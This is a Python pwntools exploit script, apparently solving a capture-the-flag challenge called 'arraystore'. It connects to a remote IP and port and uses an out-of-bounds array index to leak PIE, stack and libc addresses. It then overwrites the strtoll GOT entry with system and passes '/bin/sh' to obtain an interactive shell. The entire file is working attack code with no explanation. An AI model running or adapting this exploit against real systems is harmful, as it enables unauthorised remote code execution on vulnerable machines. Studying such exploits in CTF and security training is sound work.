from pwn import *
#io = process("./arraystore",aslr=True)
io = remote("34.124.157.94",10546)
libc = ELF("./libc.so.6")

# leak pie, stack, and libc, then overwrite strtoll@got

def leak(index):
    io.sendlineafter("Read/Write?:","R")
    io.sendlineafter("Index:",str(index))
    
    io.recvuntil("Value: ")
    return int(io.recvline()[:-1])

def write(index,value):
    io.sendlineafter("Read/Write?:","W")
    io.sendlineafter("Index:",str(index))
    
    io.sendlineafter("Value: ",str(value))


strtollGot = leak(12) + 12184
log.info("strtoll@got: " + hex(strtollGot))

arrStackAddr = leak(-25) - 803
log.info("arr address: " + hex(arrStackAddr))

toGotIndex = (strtollGot - arrStackAddr)/8

strtoq = leak(toGotIndex)
libc.address = strtoq - libc.symbols["strtoq"]

log.info("libc base: " + hex(libc.address))

write(toGotIndex,libc.symbols["system"])

io.sendlineafter("Read/Write?:","W")
io.sendlineafter("Index:","/bin/sh")

io.interactive()



